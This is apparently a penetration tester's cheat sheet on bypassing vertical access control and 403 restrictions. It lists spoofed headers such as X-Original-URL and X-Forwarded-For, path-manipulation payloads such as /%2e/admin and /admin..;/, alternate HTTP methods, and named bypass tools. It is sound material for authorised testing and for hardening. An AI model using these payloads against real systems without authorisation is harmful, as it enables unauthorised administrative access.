# Vertical Access Control

## Acces Admin	
```
Defautlt Credentials
SqlInjection
Hidden Admin Panel
Increse own rank
```
## Tools
```
bypass-403
403-bypass
B1pass3r
```	
## Header
```
X-Original-URL: PATH
X-Rewrite-URL: PATH
For Parameters in URL change to Post add Parameters in Post Body if possible
```
### Different Header names
```
X-Original-URL
X-Forward-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Scheme
Referer
Request-Uri
Base-Url
Client-IP
Http-Url
Proxy-Host
Proxy-Url
Real-Ip
Redirect
X-Client-IP
X-Custom-IP-Authorization
X-Forwarded-Server
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Originating-IP
X-Remote-IP
X-Rewrite-Url
X-True-IP
```
## Url Rewrite:
Miss match in url path e.g. 
```
/admin vs /adMiN

In Spring arbitray field extension might be possible:

/admin.anything
```
Different Combination and Payloads
```
/admin /deleteUser to /admin/deletuser or /admin/deletuser/
/%2e/admin	
/admin/.
/admin//
/admin/..
/;/admin
/;./admin/
/;//admin/
/admin..;/
```
## Different HTTP METHODs
```
POST
OPTIONS
PUT
HEAD
GET 
DELETE
PATCH
TRACE
```

